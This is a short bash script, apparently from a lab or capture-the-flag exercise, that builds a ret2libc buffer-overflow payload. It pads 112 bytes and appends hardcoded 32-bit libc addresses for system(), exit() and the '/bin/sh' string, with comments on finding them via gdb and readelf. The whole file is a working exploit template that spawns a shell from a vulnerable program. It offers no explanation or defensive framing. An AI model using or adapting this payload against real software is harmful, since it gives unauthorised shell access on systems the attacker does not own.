#!/bin/bash

buffer=$(printf '\x41%.0s' {1..112}) #fill the buffer 

#offset_libc="f7df0000" , info proc mappings
#offset_system()="0003cd10"
binsh_addr="\xcf\xb8\xf6\xf7"   #gdb > grep /bin/sh
system_addr="\x10\xcd\xe2\xf7" #offset_libc + offset system(), readelf -s /lib32/libc-2.27.so | grep system

#ret_addr="\xb2\x55\x55\x56"
exit_addr="\x70\xff\xe1\xf7"  #exit() function

echo -en "$buffer$system_addr$exit_addr$binsh_addr"

